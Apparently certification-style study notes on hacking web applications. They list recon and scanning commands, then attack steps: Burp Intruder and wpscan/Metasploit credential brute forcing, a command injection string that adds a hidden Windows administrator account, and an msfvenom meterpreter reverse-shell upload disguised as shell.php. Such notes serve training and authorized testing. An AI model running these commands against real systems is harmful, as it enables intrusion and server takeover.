## Hacking Web Applications

### Footprint infra
1. nmap
   - `nmap -T4 -A -v [doamin]`
2. telnet
   - `telnet [domain] [port]`
   - `GET / HTTP/1.0` enter twice
   - Observe: Server, Content-Type, X-Powered-By
3. whatweb
   - `whatweb -v [domain]`
   - Observe: HTTPServer, Meta-Author, PasswordField, X-Powered-By, HTTP Headers
   - No X-frame-Options header means clickjacking is possible
4. OWASP ZAP
    - Run an automated scan
    - Observe tabs: Spider, Alerts
      - Alerts: List of vulnerabilities
      - Spider > Messages:  To look for hidden content
5. Detect load balancing (multiple IPs)
   - `dig [domain]`
   - `lbd [domain]`
6. Identify Web Server Directories

   Wordlist: CEH Tools > Module 14 > common.txt
   - nmap: enumerate the applications, directories, and files of the web servers
     - `nmap -p 80 --script http-enum [domain]`
   - GoBuster: brute force directories and files
     - `gobuster dir -u [domain] -w [wordlist]`
   - dirsearch (no need for wordlist)
     - `python3 dirsearch.py -x 404,400 -u [domain] -e [extensions]`

### Identify vulnerabilities
1. Vega
   - Windows > Vega > Run As Administrator
   - Scan > Start New Scan
   - Observe: Scan Alerts sub-window
2. N-Stalker (windows)
3. Others: wpscan (wordpress), uniscan, arachini


### Attack
1. Burp Suite
   1. credentials brute force
      - Open browser and set proxy to 127.0.0.1:8080
      - Open Burp Suite
      - Proxy > Intercept > Intercept is on
      - Browse to the target website and attempt to login with a random username and password
      - Observe request intercepted in burp suite
      - Right click on the request > Send to Intruder
      - Intruder > Positions > Clear
      - Click on the username and password fields > Add
      - Attack Type: Cluster Bomb
      - Intruder > Payloads > Payload Type: Simple List
      - Payload Options > Payload Options: Load > select wordlist
      - Start Attack
      - Different values of Status and Length indicate that the combination of the respective credentials is successful.
      - turn off intercept 
      - login with credentials
   2. Parameter tampering
      - Intercept request and update query parameters, form parameters etc.
2. PwnXSS
   - parrot OS > cd PwnXSS > `python3 pwnxss.py -u http://[domain]`
   - Observe `[CRITICAL] Detected XSS` in the output
   - Go to the link mentioned and perform the XSS attack
3. WPScan
   - `wpscan --url [domain] --enumerate u`
   - Observe: Users enumerated
   - `wpscan --url [domain] --passwords [wordlist] --usernames [usernames]`
   - Observe: credentials obtained
4. Metasploit (password brute force)
   - `msfconsole`
   - `search wordpress_login_enum`
   - `use auxiliary/scanner/http/wordpress_login_enum`
   - set options: PASS_FILE, RHOSTS, RPORT, TARGETURI, USERNAME
   - `run`
   - Observe `Wordpress Brute Force - SUCCESSFUL` and see credentials
5. Command Injection
   - In the input field: ` | [command]`
   - Commands:
     - Windows: `whoami`, `hostname`, `tasklist`, `dir C:\`, `net user`
        - Add user and RDP
            - `net user [username] /add`
            - `net localgroup administrators [username] /add`
            - `net user [username]` to verify details
            - RDP to IP with username and blank password
6. File upload
   - Generate reverse_tcp raw payload using msfvenom
     - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f raw`
   - Copy the output and save it in a file with name as per the JS validation of the upload field
   - upload the file
   - use burp suite to intercept and change file name or command inject to update filename at server to shell.php
   - start meterpreter listener on PORT
   - In browser, browse to the file uploaded and execute the payload
   - Observe that meterpreter session is opened






